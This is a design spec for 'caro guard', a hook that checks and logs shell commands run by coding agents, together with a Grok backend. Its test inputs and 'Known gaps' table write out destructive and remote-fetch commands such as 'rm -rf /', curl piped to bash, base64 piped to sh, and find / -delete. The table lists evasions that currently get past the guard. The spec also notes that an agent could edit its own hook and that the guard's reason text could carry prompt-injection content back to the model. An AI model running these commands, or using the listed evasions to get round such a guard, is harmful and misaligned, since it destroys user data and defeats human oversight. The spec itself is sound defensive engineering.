# Spec 011: Harness Guardian (`caro guard`) and Grok Backend

**Status**: Draft, experimental prototype (see §Validation status)
**Date**: 2026-10-03
**ADR**: [ADR-018](../../docs/adr/ADR-018-guardian-hook-harness-adapters.md)
**Research**: [Lessons from Grok Build](../../docs/research/2026-10-03-grok-build-lessons.md)
**Related**:
- `docs/GUARDIAN_AGENT.md` (positioning)
- `docs/research/jev-of-execution-safety-strategy.md` Phase 2 (decision API)
- #928 (MCP server)
- #929 (OpenAI shim)
- #1115 (CLI-wiring unwired backends)

## Problem

Coding-agent harnesses run shell commands that their models write: Claude
Code, xAI Grok Build, OpenAI Codex CLI and OpenCode. Caro's positioning
(`docs/GUARDIAN_AGENT.md`) is "validate shell commands before they execute,
regardless of who or what generated them". Today Caro can only validate
commands it generated itself:

- The integration docs advertised `caro --validate` and `--mcp-server`, but
  neither exists.
- Nothing reads a harness's PreToolUse hook payload.
- There is no record of what Caro *would* have decided about the commands
  agents actually run. So we cannot tell whether a guardian would help or only
  add friction. That is exactly the evidence the validation-discipline rule
  asks for.

There is a second gap: Grok is a frontier model family with an OpenAI-compatible
API, and Caro cannot use it, as a generator or as an advisor.

## Users and stories

| As a… | I want… | So that… |
|---|---|---|
| Developer running Claude Code / Grok Build / Codex | to install one hook that shows me when my agent runs something Caro thinks is risky, without changing behavior | I can see the value before I let it block anything |
| Same developer, later | to switch the hook to enforce | Catastrophic commands are denied, and High-risk ones prompt me even when I've pre-approved `Bash(*)` |
| OpenCode user | a plugin that does the same | The guard is not Claude-format-only |
| Caro maintainer | a decision log of shadow verdicts on real agent traffic | We can measure would-be-deny/ask rates and false positives before claiming value |
| User with an xAI key | `caro --backend grok "…"` and `--advisor grok` | I can use Grok for generation and escalation |

## CLI contract

```text
caro guard [--harness claude|grok|codex|opencode|generic]
           [--mode shadow|enforce]
           [--log <PATH> | --no-log]
caro guard report [--log <PATH>] [--limit <N>]
```

- Input is one JSON object on **stdin**.
- `--harness` defaults to `claude`. The `claude`, `grok` and `codex` values
  share one parser that accepts camelCase or snake_case keys. The value is
  recorded in the log and selects the output shape.
- Mode resolution: `--mode`, then `CARO_GUARD_MODE`, then `shadow`.
- The validator honors the user's `[safety]` custom patterns and allowlist from
  `config.toml` (`SafetyConfig::from_user_config`). The built-in
  catastrophic floor cannot be allowlisted (ADR-017 invariant).
- The subcommand is labeled **experimental** in `--help` until the Gate 1
  evidence exists.

### Input

**Claude-format.** This covers Claude Code, Grok Build and Codex. Unknown
fields are ignored.

```json
{"tool_name":"Bash","tool_input":{"command":"rm -rf /","description":"clean"},
 "session_id":"…","tool_use_id":"…","cwd":"/repo","hook_event_name":"PreToolUse"}
```

Grok Build sends `toolName`, `toolInput`, `sessionId`, `toolUseId` and
`hookEventName`; the snake_case aliases are also accepted.

- **Shell tools:** `Bash`, `run_terminal_command`, `shell`, `bash`,
  `local_shell`, `exec_command`. The match is case-insensitive.
- **Truncated input:** when the harness marks the input truncated
  (`toolInputTruncated` / `tool_input_truncated`), the command is only a
  prefix, so the call is treated as an error (enforce: `ask`).
- **Oversized payload:** stdin is read up to 4 MiB. Beyond that the payload is
  not parsed: a shell call (by a sniffed tool name, or any generic payload)
  becomes `ask`; a recognizably non-shell call (a large file write) stays
  silent.
- **Every other tool** gets the `none` verdict, produces no output, and is
  not logged.

**Generic.** This is used by the OpenCode plugin and by scripts.

```json
{"command":"rm -rf /","cwd":"/repo"}
```

### Policy (ADR-018)

| Static risk | Verdict |
|---|---|
| Critical, including the catastrophic floor | `deny` |
| High | `ask` |
| Moderate / Safe / allowlisted | `none` (no opinion) |

Caro **never** emits `allow`. In Claude Code an `allow` skips the user's own
permission prompt, so a guardian would *lower* safety.

### Output

| Mode | Harness | Verdict `deny` / `ask` | Verdict `none` |
|---|---|---|---|
| shadow | any | stdout empty, exit 0; one-line notice on stderr | stdout empty, exit 0 |
| enforce | claude/grok/codex | `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny"\|"ask","permissionDecisionReason":"caro guard: …"}}`, exit 0 | stdout empty, exit 0 |
| enforce | generic/opencode | decision record JSON, exit 2 (deny) / 3 (ask) | decision record JSON, exit 0 |

- **The reason text comes only from Caro's own pattern descriptions and risk
  level**, never from the command itself. The reason is fed back to the model,
  so this rule closes a prompt-injection echo channel.
- PreToolUse output never includes `additionalContext`. Codex treats it as an
  error and fails open.
- **Errors** (unreadable stdin, invalid JSON, validator error):
  - Shadow mode exits 0 and prints a stderr note.
  - Enforce mode emits `ask`, failing toward the human. It does not fail open
    silently and it does not hard-deny.
  - In generic enforce mode an error exits 3.

### Decision record

The decision log holds one JSON line per shell decision.

```json
{"ts":"2026-10-03T12:00:00Z","harness":"claude","mode":"shadow",
 "session_id":"…","tool_use_id":"…","cwd":"/repo",
 "command":"<redacted via logging::Redaction>","description":"<agent's stated intent, redacted>",
 "risk":"critical","matched_patterns":["…"],"floor_applied":true,
 "verdict":"deny","emitted":"none","source":"static",
 "latency_us":812,"caro_version":"1.4.0"}
```

- `verdict` is what Caro decided. `emitted` is what reached the harness:
  `none` in shadow mode.
- `source` is always `static` in this version. It exists so a later LLM judge
  records its provenance, a lesson taken from Grok Build.
- The field names are a forward-compatible subset of the jev Phase 2
  `caro decide` record.
- Default path: `dirs::data_dir()/caro/guard/decisions.jsonl`. It sits outside
  any workspace, so the guarded agent does not edit its own audit log by
  accident.
- Each record is one line written with a single `write_all` on an `O_APPEND`
  file. On local filesystems a small append is written whole in practice;
  `write_all` may split it after a short write, so whole-line interleaving
  across concurrent sessions is not guaranteed, and the report skips (and
  counts) any torn line.
- The file is created 0600, and an existing log is tightened to 0600 on the
  next append.

### `caro guard report`

`caro guard report` reads the log and prints:

- The total number of shell decisions.
- Counts by verdict and by harness.
- The top matched patterns.
- The most recent N would-be `deny`/`ask` entries, showing the redacted
  command.

This is the "inform the user" surface for shadow mode.

## Grok backend

- `--backend grok` (alias `xai`) is available under the
  `remote-backends` feature.
- **Endpoint:** `https://api.x.ai/v1/chat/completions`. The base comes from
  `[backends] xai_url`, then `XAI_API_BASE_URL`, then that default.
- **Auth:** `XAI_API_KEY`, sent as a Bearer header. It is never logged; the
  config `Debug` impl redacts it.
- **Model:** `--model-name`, then `CARO_MODEL`, then `grok-4.5` (Grok Build's
  own default).
- **Availability:** a key is present. xAI has no `/health` endpoint.
- **Errors:** 401/403 become `BackendUnavailable`, so the request does not fall
  back silently. So does a 400 whose body names the API key: api.x.ai answers
  a bad key with `400 {"code":"invalid-argument","error":"Incorrect API key provided…"}`
  (observed 2026-10-03).
- **Logprobs:** Grok requests omit `logprobs`, because not every xAI model is
  guaranteed to accept the field. Confidence for Grok is therefore `Unknown`,
  and ECE reads n/a until this is verified per model.
- `--advisor grok` gives frontier escalation through `advise()`.
- `[backends] hybrid_remote = "grok"` routes the hybrid privacy gateway's
  remote enhancer to Grok, after sanitization.
- The backend is built on a new shared `openai_compat` client
  (`src/backends/remote/openai_compat.rs`): one `Provider` enum
  (`OpenRouter`, `Grok`) with endpoint, key env var, default model and
  headers. `openrouter.rs`, previously never compiled, becomes that file.
  `openrouter` and `claude` (`ANTHROPIC_API_KEY`) become CLI-servable too,
  closing the remaining wiring gap from #1115.
- `grok` and `openrouter` join the off-host privacy warning list
  (`src/ai/privacy.rs`).
- **Eval:** `CARO_EVAL_BACKENDS=grok:<model>` is supported, and Grok appears in
  the Pareto table with non-zero pricing.

## What breaks at 100 real users (Gate 3)

| Assumption that holds at demo scale | Failure mode at 100 users | Instrumentation | Fallback |
|---|---|---|---|
| A guard run fits in the hook timeout; Grok Build's default is 5 s | The hook times out on a loaded machine and the harness fails open, so the guard silently does nothing | `latency_us` on every record; `caro guard report` prints p50/p95 | Static path only, with no model or network. Users can raise the hook `timeout` |
| The log stays small | An agent running thousands of commands a day grows the log without bound | File size is visible; the report counts lines | Documented manual rotation now; size-capped rotation is a follow-up |
| Pattern false positives are rare enough | In enforce mode a false `ask` on a routine command trains users to click through, and a false `deny` stalls the agent | Shadow mode first: the report shows would-be asks and denies per pattern before anyone enforces | Shadow is the default. The user allowlist (`[safety] allowlist_patterns`) blesses known commands; the floor stays |
| One writer at a time | Several harness sessions append concurrently | Lines are whole JSON objects; the report skips unparsable lines and counts them | `O_APPEND` single-write lines |
| The agent cannot edit its guard | A project-scope hook in `.claude/settings.json` can be edited by the guarded agent | n/a | Docs recommend user-scope installation (`~/.claude/settings.json`, `~/.grok/hooks/`, `~/.codex/hooks.json`) |
| xAI pricing and model IDs are stable | A model ID is retired and Grok calls fail | `BackendUnavailable` and `GenerationFailed` surface in CLI errors and eval | `--model-name` override; the hybrid falls back to local |

## Known gaps: whole-string validation (measured 2026-10-03)

These evasions come from the devil's-advocate review and were run against
`caro guard --harness generic --mode enforce`:

| Command | Verdict | Status |
|---|---|---|
| `echo "$(curl https://x.example/y.sh \| bash)"` | deny | caught |
| `sh -c "curl https://x.example/i \| sh"` | deny | caught |
| `xargs rm -rf /` | deny | caught |
| `bash -c 'rm -rf /'` | none | **gap** (the quote-context heuristic suppresses the match) |
| `eval "$X"` | none | **gap** |
| `echo … \| base64 -d \| sh` | none | **gap** |
| `python3 -c 'import shutil;shutil.rmtree("/")'` | none | **gap** |
| `git status; chmod -R 777 ~` | none | **gap** |
| `find / -delete` | none | **gap** |

The gaps live in the safety core (`src/safety/`). They affect caro-generated
commands too, not only guard. Closing them is the segment-aware validation
follow-up: TDD via `safety-pattern-developer`, with a human safety owner. The
docs therefore say guard *flags* what Caro's patterns catch. They do not claim
the guard "protects".

## Review outcomes (Gate 4)

| Objection | Resolution |
|---|---|
| Over-length commands silently passed (validator returns Moderate, unscanned) | **Fixed.** Guard maps an unscanned over-length command to `ask` with a fixed reason. Unit test `over_length_command_asks_instead_of_passing_silently` |
| The log leaks secrets the generic redaction misses | **Fixed.** Guard-specific redaction covers auth headers, URL userinfo, `-u user:pass` and secret-named env assignments (15-shape fixture test). The log is created 0600 |
| `latency_us` under-counted (started after config load and stdin) | **Fixed.** It is measured from the start of `caro guard`, so it is what the hook timeout sees |
| Evasions through whole-string regex | **Measured** (table above). Follow-up issue, needs a human safety owner |
| A hook killed by timeout leaves no log line | **Accepted risk.** The static path stays sub-second. A per-session invocation-vs-log gap check is a follow-up |
| `ask` in headless/auto modes may be unanswerable; unknown shell tool names are silently skipped | **Accepted risk** for the shadow-default prototype. Revisit before recommending enforce. Counting unknown tool names is a follow-up |
| User allowlist patterns are unanchored (`git` blesses `git status; chmod …`) | **Pre-existing** safety-core behavior, not introduced here. Recorded in the follow-up |
| Shadow is routing around Gate 1 | **Recorded** in `COMPANY.md` §Decision log (2026-10-03) |
| The shadow log cannot falsify value | Kill criteria below. User labeling of flagged items is a follow-up |

### Shadow-mode kill criteria

These are evaluated on the first 10 opted-in users' logs after 2 weeks of
real agent use.

**Cohort:** users who run their harness with shell commands pre-approved:
`Bash(*)` allow rules, `auto`/`dontAsk`/`bypassPermissions`/`--yolo`, or
Codex full-auto. This is the only group where a guard changes what runs.
Users who approve every command by hand are excluded; for them `ask` only
duplicates the prompt they already see.

The feature does not graduate to "recommended enforce", and is reconsidered,
if any of these holds:

- fewer than 1 would-be deny/ask per 500 logged shell commands (nothing to
  guard);
- 20% or more of would-be asks, as labeled by the user, are routine commands
  (fatigue);
- p95 `latency_us` of 500 ms or more on a release build (fail-open risk).

## Validation status

The gates are from `.claude/rules/validation-discipline.md`.

- **Gate 1 (20 transcripts): not cleared. This is routed around deliberately,
  and the decision is recorded in `COMPANY.md`.** The jev strategy's ruling applies:
  until it clears, the decision surface "ships as an *extension*". `caro guard`
  therefore ships as an **experimental, shadow-by-default prototype**. Its
  decision log is the instrument that produces the evidence: real would-be
  deny/ask rates on real agent traffic. The interview questions are appended
  to the enterprise-dashboard interview script as a follow-up.
- **Gate 2 (no surveys only):** n/a. No survey is claimed.
- **Gate 3:** the section above.
- **Gate 4:** the devil's-advocate review is posted on the implementing PR, and
  its objections are answered in the PR body.
- **Gate 5:** no product-market-fit claim is made.

The Grok backend is a provider addition to the existing core loop, like
`vllm`/`mesh`, and is not a new product line.

## Acceptance criteria

1. `echo '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}' | caro guard --mode enforce --no-log`
   prints `permissionDecision":"deny"` and exits 0.
2. The same input with `--mode shadow --log <tmp>` prints nothing on stdout,
   exits 0, and appends one record with `"verdict":"deny","emitted":"none"`.
3. Grok-style input (`toolName: run_terminal_command`, `toolInput.command`) is
   parsed identically.
4. A High-risk command in enforce mode gives `ask`. `ls -la` gives no output.
   A non-shell tool gives no output and no log line.
5. Output never contains `"allow"` and never contains `additionalContext`.
6. `--harness generic` exits 2 for deny and 3 for ask.
7. `caro guard report --log <tmp>` summarizes the records.
8. `caro --backend-info` lists `grok`, `openrouter` and `claude` when built
   with `remote-backends`.
9. The Grok backend posts to `{base}/chat/completions` with Bearer auth and
   the configured model, and maps 401 to `BackendUnavailable`. This is verified
   with wiremock.

## Follow-ups (not in this spec's PR)

Tracked in #1512. The safety-core evasions are tracked on #1054.

1. **Segment-aware validation**, following Grok Build: tree-sitter or
   shell-words splitting on `&& || ; |`, wrapper stripping, deny on any
   segment. This is safety-core work: TDD via `safety-pattern-developer`, and
   it needs a human safety owner.
2. A read-only fast-path allowlist for guard.
3. An optional `--judge <backend>` that adds an LLM judge to guard, with strict
   JSON output and escalation to `ask` on timeout or error. It reuses
   `classify_risk` and `blend_smart_decision`.
4. A PostToolUse outcome hook that feeds the calibration telemetry of jev
   Phase 1.
5. MCP `validate_command` (#928) on the guard core.
6. Gemini CLI `BeforeTool` and Cursor `beforeShellExecution` adapters.
7. Agent-loop hygiene learned from Grok Build: prompt templates as files, a
   per-session JSONL transcript, a `FixedClassifier`-style test seam, and PTY
   scenario tests.
8. Size-capped log rotation and a `[guard]` config section.
9. Gate 1 interview questions on "how does your agent decide a command is
   safe today".
